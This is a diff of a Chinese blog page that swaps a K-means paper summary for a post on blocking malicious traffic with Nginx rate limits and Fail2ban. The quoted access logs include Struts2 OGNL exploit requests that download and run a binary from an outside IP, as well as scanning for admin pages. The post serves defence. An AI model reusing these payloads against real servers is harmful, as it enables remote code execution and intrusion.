@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="数据挖掘," />
+  <meta name="keywords" content="Nginx," />
 
 
 
@@ -79,29 +79,21 @@
 
 
 
-<meta name="description" content="原论文Q. He, X. Zhu, D. Li, et al., “Cost-effective Big Data Mining in the Cloud: A Case Study with K-means,” in Cloud Computing (CLOUD), 2017 IEEE 10th International Conference on, 2017, pp. 74-81. (EI:">
-<meta name="keywords" content="数据挖掘">
+<meta name="description" content="前言最近查看网站 Nginx 日志时，发现了很多恶意试探与攻击请求，最后是用 Nginx 自带的流量控制与 Fail2ban 动态黑名单解决了，效果不错，当有 IP 被 Ban 时还会有邮件通知，挺方便的。 Nginx log file分析 Nginx 日志内容，其中既有尝试攻击 Struts2 远程执行漏洞的： 12178.128.122.170 - - [16/Nov/2018:23:50:0">
+<meta name="keywords" content="Nginx">
 <meta property="og:type" content="article">
-<meta property="og:title" content="云计算下大数据挖掘的成本效益：以K-means算法为例">
-<meta property="og:url" content="http://marticles.github.io/2018/05/31/云计算下大数据挖掘的成本效益-以K-means算法为例/index.html">
+<meta property="og:title" content="Nginx流量控制配合Fail2ban抵御流量攻击">
+<meta property="og:url" content="http://marticles.github.io/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/index.html">
 <meta property="og:site_name" content="0xCAFEBABE">
-<meta property="og:description" content="原论文Q. He, X. Zhu, D. Li, et al., “Cost-effective Big Data Mining in the Cloud: A Case Study with K-means,” in Cloud Computing (CLOUD), 2017 IEEE 10th International Conference on, 2017, pp. 74-81. (EI:">
+<meta property="og:description" content="前言最近查看网站 Nginx 日志时，发现了很多恶意试探与攻击请求，最后是用 Nginx 自带的流量控制与 Fail2ban 动态黑名单解决了，效果不错，当有 IP 被 Ban 时还会有邮件通知，挺方便的。 Nginx log file分析 Nginx 日志内容，其中既有尝试攻击 Struts2 远程执行漏洞的： 12178.128.122.170 - - [16/Nov/2018:23:50:0">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-2-large.gif">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-3-small.gif">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-table-1-small.gif">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-table-2-small.gif">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-4-small.gif">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-5-small.gif">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/dataset.png">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/LP1.PNG">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/result.PNG">
-<meta property="og:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/percent.PNG">
-<meta property="og:updated_time" content="2018-07-22T16:39:32.920Z">
+<meta property="og:image" content="http://marticles.github.io/images/Nginx流量控制配合Fail2ban抵御流量攻击/google.png">
+<meta property="og:image" content="http://marticles.github.io/images/Nginx流量控制配合Fail2ban抵御流量攻击/baidu.png">
+<meta property="og:updated_time" content="2018-11-17T14:57:47.672Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="云计算下大数据挖掘的成本效益：以K-means算法为例">
-<meta name="twitter:description" content="原论文Q. He, X. Zhu, D. Li, et al., “Cost-effective Big Data Mining in the Cloud: A Case Study with K-means,” in Cloud Computing (CLOUD), 2017 IEEE 10th International Conference on, 2017, pp. 74-81. (EI:">
-<meta name="twitter:image" content="http://marticles.github.io/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-2-large.gif">
+<meta name="twitter:title" content="Nginx流量控制配合Fail2ban抵御流量攻击">
+<meta name="twitter:description" content="前言最近查看网站 Nginx 日志时，发现了很多恶意试探与攻击请求，最后是用 Nginx 自带的流量控制与 Fail2ban 动态黑名单解决了，效果不错，当有 IP 被 Ban 时还会有邮件通知，挺方便的。 Nginx log file分析 Nginx 日志内容，其中既有尝试攻击 Struts2 远程执行漏洞的： 12178.128.122.170 - - [16/Nov/2018:23:50:0">
+<meta name="twitter:image" content="http://marticles.github.io/images/Nginx流量控制配合Fail2ban抵御流量攻击/google.png">
 
 
 
@@ -131,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://marticles.github.io/2018/05/31/云计算下大数据挖掘的成本效益-以K-means算法为例/"/>
+  <link rel="canonical" href="http://marticles.github.io/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/"/>
 
 
 
 
 
-  <title>云计算下大数据挖掘的成本效益：以K-means算法为例 | 0xCAFEBABE</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title>Nginx流量控制配合Fail2ban抵御流量攻击 | 0xCAFEBABE</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
 
@@ -308,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/05/31/云计算下大数据挖掘的成本效益-以K-means算法为例/">
+    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Marticles">
@@ -325,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">云计算下大数据挖掘的成本效益：以K-means算法为例</h1>
+          <h1 class="post-title" itemprop="name headline">Nginx流量控制配合Fail2ban抵御流量攻击</h1>
         
 
         <div class="post-meta">
@@ -337,8 +329,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-31T22:29:25+08:00">
-                2018-05-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-17T22:48:12+08:00">
+                2018-11-17
               </time>
             
 
@@ -360,8 +352,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/读论文/" itemprop="url" rel="index">
-                    <span itemprop="name">读论文</span>
+                  <a href="/categories/运维/" itemprop="url" rel="index">
+                    <span itemprop="name">运维</span>
                   </a>
                 </span>
 
@@ -378,8 +370,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/05/31/云计算下大数据挖掘的成本效益-以K-means算法为例/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/05/31/云计算下大数据挖掘的成本效益-以K-means算法为例/" itemprop="commentCount"></span>
+                <a href="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -387,7 +379,7 @@
 
           
           
-             <span id="/2018/05/31/云计算下大数据挖掘的成本效益-以K-means算法为例/" class="leancloud_visitors" data-flag-title="云计算下大数据挖掘的成本效益：以K-means算法为例">
+             <span id="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/" class="leancloud_visitors" data-flag-title="Nginx流量控制配合Fail2ban抵御流量攻击">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -412,7 +404,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,926 字
+                  1,761 字
                 </span>
               
 
@@ -437,118 +429,46 @@
       
 
       
-        <h3 id="原论文"><a href="#原论文" class="headerlink" title="原论文"></a>原论文</h3><p>Q. He, X. Zhu, D. Li, et al., “Cost-effective Big Data Mining in the Cloud: A Case Study with K-means,” in <strong><em>Cloud Computing (CLOUD)</em></strong>, <strong><em>2017 IEEE 10th International Conference on, 2017</em></strong>, pp. 74-81. (EI: 20174404313852)</p>
-<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>在某些大数据挖掘情景下，100%的准确率是没有必要的，通常采用的是比100%准确率成本低得多的准确率，例如99%或99.9%。事实上，在某些例如天气预测和交通堵塞预测这类预测情景下，达到100%的准确率也是不可能的。所以在一个合理的准确度停下，可以达到更好的成本效益。这对于中小企业来说，是十分重要的。</p>
-<p>在以K-means算法为例的聚类任务中，论文发现达到99%的聚类准确度只需要花费达到100%准确度的0.32%-46.17%成本。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近查看网站 Nginx 日志时，发现了很多恶意试探与攻击请求，最后是用 Nginx 自带的流量控制与 Fail2ban 动态黑名单解决了，效果不错，当有 IP 被 Ban 时还会有邮件通知，挺方便的。</p>
+<h2 id="Nginx-log-file"><a href="#Nginx-log-file" class="headerlink" title="Nginx log file"></a>Nginx log file</h2><p>分析 Nginx 日志内容，其中既有尝试攻击 Struts2 远程执行漏洞的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">178.128.122.170 - - [16/Nov/2018:23:50:08 +0800] http &quot;GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&amp;&amp;%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)&amp;&amp;(pkill%20loop%20&amp;&amp;%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">178.128.122.170 - - [16/Nov/2018:23:50:08 +0800] http &quot;GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&amp;cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br></pre></td></tr></table></figure>
+<p>也有尝试登录 WP 管理页面的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">93.115.97.183 - - [17/Nov/2018:06:04:45 +0800] http &quot;GET /wp-login.php HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.163</span><br><span class="line">93.115.97.183 - - [17/Nov/2018:06:04:45 +0800] http &quot;GET /administrator/ HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.204</span><br><span class="line">93.115.97.183 - - [17/Nov/2018:06:04:45 +0800] http &quot;GET /admin.php HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.203</span><br><span class="line">123.31.30.209 - - [17/Nov/2018:06:08:27 +0800] http &quot;GET / HTTP/1.1&quot; 200 30075 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.005</span><br><span class="line">123.31.30.209 - - [17/Nov/2018:06:08:27 +0800] http &quot;GET /wp-includes/wlwmanifest.xml HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.154</span><br><span class="line">123.31.30.209 - - [17/Nov/2018:06:08:27 +0800] http &quot;GET /xmlrpc.php?rsd HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.053</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><p>Mehrotra等人在NASA的高性能机群计算与Iousp等人在多任务计算的研究中得出了相似的结论，即公有云的性能对于高性能计算应用来说还不够高。Berriman等人通过比较亚马逊EC2云服务器与美国国家超级计算机中心的Abe高性能集群发现，亚马逊EC2云能为处理器与内存受限的应用提供比I/O受限应用更高的性能与价值。Carlyle等人在普渡大学的”community cluster”计划中，比较了传统HPC与亚马逊EC2云的高性能计算成本，他们的研究发现当满足以下三个条件时，内部集群更具成本效益:1.有足够的需求充分利用机群 2.有能有维护IT基础设施的IT部门 3.以计算网络研究为优先。Deelman等人发现在云服务器中运行计算密集型应用比数据密集型应用更具成本效益。 Gupta等人的实验表明目前云计算并不能完全替代超级计算机，但能有效的与之互补。</p>
-<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>采用K-means中的Lloyd算法</p>
-<h3 id="评价指标"><a href="#评价指标" class="headerlink" title="评价指标"></a>评价指标</h3><p>采用Rand index(兰德指数)衡量K-means聚类后的结果与原数据集的相似度,范围0-1</p>
-<h3 id="付费模式"><a href="#付费模式" class="headerlink" title="付费模式"></a>付费模式</h3><p>采用亚马逊云的按需付费模式(时间),通过计算每次K-means的过程耗时即可得出费用。运行K-means可能会产生其他成本，比如要传输聚类的数据集,但论文研究只关注计算时间成本。</p>
-<h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p>实验中采用了两种数据集:</p>
-<ul>
-<li>高斯数据集:这是利用基于高斯分布生成的数据集。首先随机产生72个点，然后以这每个点基于标准差=0.05的高斯分布生成13,889个二维数据点。在这个32Mb的数据集中共有1,000,008个二维数据点。</li>
+<p>还有尝试 php 注入攻击的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:26 +0800] http &quot;GET /phpmyadmin/scripts/setup.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:26 +0800] http &quot;GET /phpMyAdmin/scripts/setup.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:26 +0800] http &quot;GET /phpmyadmin/scripts/db___.init.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:26 +0800] http &quot;GET /phpMyAdmin/scripts/db___.init.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.001</span><br></pre></td></tr></table></figure>
+<p>还有试探各种 admin 页面的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:36 +0800] http &quot;GET /phpmyadmin/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:36 +0800] http &quot;GET /phpMyAdmin/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /pmd/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.001</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /pma/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /PMA/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /PMA2/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /pmamy/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.001</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /pmamy2/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /mysql/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /admin/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.001</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /db/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /dbadmin/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /web/phpMyAdmin/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /admin/pma/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /admin/PMA/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /admin/mysql/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br><span class="line">202.29.212.162 - - [16/Nov/2018:19:47:37 +0800] http &quot;GET /admin/mysql2/index.php HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.001</span><br></pre></td></tr></table></figure>
+<p><strong>对此，我只想说，我的小服务器就挂了个SS和网站，有那么高攻击价值嘛？</strong></p>
+<h2 id="Nginx-实现流量控制与手动禁-IP"><a href="#Nginx-实现流量控制与手动禁-IP" class="headerlink" title="Nginx 实现流量控制与手动禁 IP"></a>Nginx 实现流量控制与手动禁 IP</h2><h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><ul>
+<li><code>limit_req_zone $variable zone=name:size rate=rate</code>：设置一块 siez 大小的内存用来保存状态参数。如果内存超过 size 耗尽了，对于后续的所有请求，Nginx 都会返回503 错误，速度可以设置为每秒处理请求数或每分钟处理请求数，但必须是整数，用来<strong>限制每个 IP 发起的请求数</strong>。</li>
+<li><code>limit_conn_zone $binary_remote_addr zone=name:size</code>：参数意义同上，用来<strong>限制每个 IP 发起的连接数</strong>。</li>
 </ul>
-<ul>
-<li>道路网络数据集:这是一个UCI机器学习与智能系统提供的公共数据集，覆盖了丹麦North Jutland中185x135km<sup>2</sup>的区域。这个20Mb的数据集中共有434,8743个三维数据点。</li>
+<p>在<code>http</code>段内配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 内存区域名称为 req_zone，大小为10m，每个IP的请求频率不能超过每秒5次</span><br><span class="line">limit_req_zone $binary_remote_addr zone=req_zone:10m rate=5r/s;</span><br><span class="line"># 内存区域名称为conn_zone，大小为10m</span><br><span class="line">limit_conn_zone $binary_remote_addr zone=conn_zone:10m;</span><br></pre></td></tr></table></figure></p>
+<p>对于<code>limit_conn_zone</code>，还需要在<code>location</code>段内配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 限制每个 IP 只能发起 1 个连接</span><br><span class="line">limit_conn conn_zone 1;</span><br></pre></td></tr></table></figure>
+<p>注意二者的区别，connection 是 tcp/ip 连接，request 是 http 请求。</p>
+<h3 id="手动禁-IP"><a href="#手动禁-IP" class="headerlink" title="手动禁 IP"></a>手动禁 IP</h3><p>先新建一个<code>blockips.conf</code>专门用来存放要禁的IP，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deny xxx.xxx.xxx.xxx.xxx;</span><br></pre></td></tr></table></figure></p>
+<p>在<code>http</code>段内配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include blockips.conf;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Fail2ban-实现动态黑名单与邮件通知"><a href="#Fail2ban-实现动态黑名单与邮件通知" class="headerlink" title="Fail2ban 实现动态黑名单与邮件通知"></a>Fail2ban 实现动态黑名单与邮件通知</h2><h3 id="动态黑名单"><a href="#动态黑名单" class="headerlink" title="动态黑名单"></a>动态黑名单</h3><p>VPS用的是 Ubuntu16.04，以下操作都是在该环境下完成。</p>
+<p>首先在<code>/etc/fail2ban/filter</code>新建<code>nginx-cc.conf</code>，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Definition]</span><br><span class="line">failregex = -.*- .*HTTP/1.* .* .*$</span><br><span class="line">ignoreregex =</span><br></pre></td></tr></table></figure></p>
+<p>在<code>/etc/fail2ban</code>新建<code>jail.local</code>，内容如下：<br>注：不建议修改默认的<code>jail.conf</code>，Fail2ban 会动态加载<code>jail.local</code>内的配置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 使用ufw而不是iptables</span><br><span class="line">banaction = ufw</span><br><span class="line"></span><br><span class="line">[http-cc]</span><br><span class="line">enabled = true</span><br><span class="line">port = http,https</span><br><span class="line">filter = nginx-cc</span><br><span class="line">logpath = /var/log/nginx/access.log</span><br><span class="line">maxretry = 10</span><br><span class="line">findtime = 5</span><br><span class="line">bantime = -1 # 默认为秒，-1代表永久</span><br><span class="line"># 每5秒内发出超过10次请求的IP将被永久封禁</span><br></pre></td></tr></table></figure></p>
+<p>重启服务：<code>systemctl restart fail2ban</code></p>
+<p>日志文件在：<code>/var/log/fail2ban.log</code></p>
+<h3 id="使用-mail-发送邮件通知"><a href="#使用-mail-发送邮件通知" class="headerlink" title="使用 mail 发送邮件通知"></a>使用 mail 发送邮件通知</h3><p>安装 mail：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install heirloom-mailx</span><br></pre></td></tr></table></figure></p>
+<p>修改<code>/etc/s-nail.rc</code>配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set from=&quot;xxx@126.com&quot;</span><br><span class="line">set smtp=&quot;smtps://smtp.126.com:587&quot;</span><br><span class="line">set smtp-auth-user=&quot;xxxm@126.com&quot;</span><br><span class="line">set smtp-auth-password=&quot;password&quot;</span><br><span class="line">set smtp-auth=login</span><br></pre></td></tr></table></figure></p>
+<p>在<code>jail.local</code>中加入以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail-whois[name=NginxBanedIP, dest=my@qq.com, sender=xxx@126.com]</span><br></pre></td></tr></table></figure></p>
+<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul>
+<li>启动/重启/停止/查看<code>fail2ban</code>状态：<code>systemctl start/restart/stop/status fail2ban</code></li>
+<li>启动/重载配置/停止<code>jail</code>：<code>fail2ban-client start/reload/stop</code></li>
+<li>设置某个<code>jail</code>的忽略IP：<code>fail2ban-client set &lt;JAIL&gt; addignoreip &lt;IP&gt;</code></li>
+<li>删除某个<code>jail</code>的忽略IP：<code>fail2ban-client set &lt;JAIL&gt; delignoreip &lt;IP&gt;</code></li>
+<li>将指定IP加入某个<code>jail</code>：<code>set &lt;JAIL&gt; banip &lt;IP&gt;</code></li>
+<li>将指定IP从某个<code>jail</code>中移除：<code>set &lt;JAIL&gt; unbanip &lt;IP&gt;</code></li>
 </ul>
-<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><center>
-
-<img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-2-large.gif">
-
-
-
-图1:高斯数据集下K-means的准确率与耗时
-
-</center>
-
-
-
-
-
-<p>上图显示k-means算法首先进行相对少量的迭代以达到一定足够高的准确率，然后进行了大量迭代达到100%的准确率，这就是长尾效应。长尾现象表明k-means算法在中后期消耗了大部分计算时间。例如当k = 64时,k-means算法需要3次迭代（2.27秒）达到0.99的精确度，即99％，然后继续进行84次迭代（33.20秒）才达到100%的准确率。</p>
-<center>
-
-<img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-3-small.gif">
-
-
-
-图2:道路网络数据集下K-means的准确率与耗时
-
-</center>
-
-
-
-
-
-<p>道路网络数据集也展示了类似的长尾效应，这在真实数据中证实了在高斯数据集中的发现，表面了在现实世界的大数据挖掘情景中，成本效益具有极高的意义。</p>
-<center>
-
-<img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-table-1-small.gif">
-
-
-
-表1:多个k值下计算耗时百分比 (高斯数据集)
-
-</center>
-
-
-
-<center>
-
-<img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-table-2-small.gif">
-
-
-
-表2:多个k值下计算耗时百分比 (道路网络数据集)
-
-</center>
-
-
-
-<p>从上述两个表格不难发现，为了从准确率99%达到接近100%，这1%的准确率耗费了大量的计算时间。这再次表明，在牺牲极少的准确率下，在适合的时间点停下迭代算法，可以为用户省下大量的费用。</p>
-<h3 id="长尾效应"><a href="#长尾效应" class="headerlink" title="长尾效应"></a>长尾效应</h3><p>通过其他实验，论文还发现选择不好的初始中心点导致了十分明显的长尾效应。</p>
-<p><img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-4-small.gif" alt=""></p>
-<center>图3:高斯数据集上K-means的准确率与耗时，k=20，随机初始化中心点</center>
-
-
-<p>与图1所不同，图3的长尾效应要明显得多。内部图放大了外部图中准确率超过0.99的部分。k=20下K-means用了总计算时间的2.23%，达到0.99的准确率（精确值为0.9927）。为了达到0.999的准确率和0.9999的准确率，耗时分别只占总计算时间的3.79%和6.50%。这种情况下比较极端，即最后为了增加0.0001的准确率，耗费了93.50%的总时间，这显然是十分荒谬的。</p>
-<p><img src="/images/云计算下大数据挖掘的成本效益-以K-means算法为例/8030574-fig-5-small.gif" alt=""></p>
-<center>图4:道路网络数据集上K-means的准确率与耗时，k=10，随机初始化中心点</center>
-
-
-
-
-
-<p>图4中还发现了算法对长尾部分上每次迭代所耗费的计算时间高度不均，曲线有明显波动，有些耗时比其他的要长得多。这是因为算法不得不在每次迭代中改变中心点，这种情况在选择较好的初始中心点时较少发生。  </p>
